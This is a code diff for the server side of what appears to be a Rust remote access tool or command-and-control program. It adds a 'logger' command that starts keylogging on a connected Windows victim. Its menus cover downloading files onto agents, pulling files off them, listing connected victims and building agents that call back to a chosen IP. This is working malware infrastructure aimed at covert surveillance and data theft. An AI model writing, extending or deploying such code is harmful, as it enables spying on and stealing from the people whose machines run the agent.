@@ -81,6 +81,15 @@ fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<S
             output.push('\0');
             println!("Local Returns \n{}", &output);
             continue;
+        }  else if msg.trim()==String::from("logger"){ //starts key logger
+            msg.push('\0');
+            let mut buffer: Vec<u8> = Vec::new();
+            clientsocket.write(msg.as_bytes());
+            println!("Sent command {}", &msg);
+            println!("Experimental Feature, works only on Windows for now'\n");
+            println!("Started logging. When you want to retrieve logs, type 'rx' then '.keylogger'\n");
+            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
+            continue;
         } else if msg.trim()==String::from("build"){ //send commands to local server OS
             msg.push('\0');
             println!("Enter the IP address that your agent should connect to (Ex: 192.168.1.1) : ");
@@ -223,7 +232,7 @@ fn handle_local(clients: &Arc<Mutex<HashMap<String, TcpStream>>>) {
     let client_list = clients.lock().unwrap().keys().cloned().collect::<Vec<String>>();
     let num_clients = client_list.len();
     
-    println!(" 
+    println!("\n                              Welcome Home
 
                     █▄─▄▄▀█▄─▄▄─█▄─▄▄▀█─▄▄─█▄─▀─▄█
                     ██─▄─▄██─▄█▀██─██─█─██─██▀─▀██
@@ -231,10 +240,10 @@ fn handle_local(clients: &Arc<Mutex<HashMap<String, TcpStream>>>) {
                     
         _______________________________________________________________
 
-        Type 'rtfm' for help \n"); //,clients.keys(), clientsocket.local_addr().unwrap(),clientaddr); // {:?} inside Map
+        Type 'rtfm' for options. Type 'quit' to continue to listener\n");
 
     loop {
-        println!("Welcome to the home menu: ");
+        println!("Enter Command: ");
         let mut msg = String::new();
         io::stdin().read_line(&mut msg).expect("String expected");
 
@@ -243,46 +252,34 @@ fn handle_local(clients: &Arc<Mutex<HashMap<String, TcpStream>>>) {
             break;
         }
         if msg.trim()==String::from("rtfm"){ 
-            println!("THE MANUAL_________________________________________________________________\n");
+            println!("THE STAGING MENU_________________________________________________________________\n");
             if cfg!(windows) {
                 println!("Usage: [COMMAND]           Gives result\n");
                 println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                 println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                 println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
-                println!(" quit,                     Quits Home Menu and continues to Listener\n");
+                println!(" quit,                     Quits Staging Menu and continues to Listener\n");
                 println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
-                println!(" local,                    Allows commands to send to local server OS while in shell\n");
                 println!(" build,                    Builds agent program, given server IP and port to connect to\n");
             } else if cfg!(unix) { 
                 println!("Usage: [COMMAND]           Gives result\n");
                 println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                 println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                 println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
-                println!(" quit,                     Quits current client connection\n");
+                println!(" quit,                     Quits Staging Menu and continues to Listener\n");
                 println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
-                println!(" local,                    Allows commands to send to local server OS while in shell\n");
                 println!(" build,                    Builds agent program, given server IP and port to connect to\n");
             } else if cfg!(target_os = "macos") {
                 println!("Usage: [COMMAND]           Gives result\n");
                 println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                 println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                 println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
-                println!(" quit,                     Quits current client connection\n");
+                println!(" quit,                     Quits Staging Menu and continues to Listener\n");
                 println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
-                println!(" local,                    Allows commands to send to local server OS while in shell\n");
                 println!(" build,                    Builds agent program, given server IP and port to connect to\n");
             }
         }
-        else if msg.trim()==String::from("local"){ //send commands to local server OS
-            msg.push('\0');
-            println!("Enter name of Command to send locally: ");
-            let mut msg = String::new();
-            io::stdin().read_line(&mut msg).expect("String expected");
-            let mut output =executecmd(String::from(&msg).trim_end_matches('\0'));
-            output.push('\0');
-            println!("Local Returns \n{}", &output);
-            continue;
-        } else if msg.trim()==String::from("build"){ //send commands to local server OS
+        else if msg.trim()==String::from("build"){ //send commands to local server OS
             msg.push('\0');
             println!("Enter the IP address that your agent should connect to (Ex: 192.168.1.1) : ");
             let mut msgip = String::new();
@@ -368,7 +365,8 @@ fn handle_local(clients: &Arc<Mutex<HashMap<String, TcpStream>>>) {
         else {
             msg.push('\0');
             let mut buffer: Vec<u8> = Vec::new();
-            println!("Sent {}", &msg);
+            let mut output =executecmd(String::from(&msg).trim_end_matches('\0'));
+            println!("Local Returns: \n{}", &output);
         }
         if msg.trim()==String::from("quit"){
             println!("Going to connections");
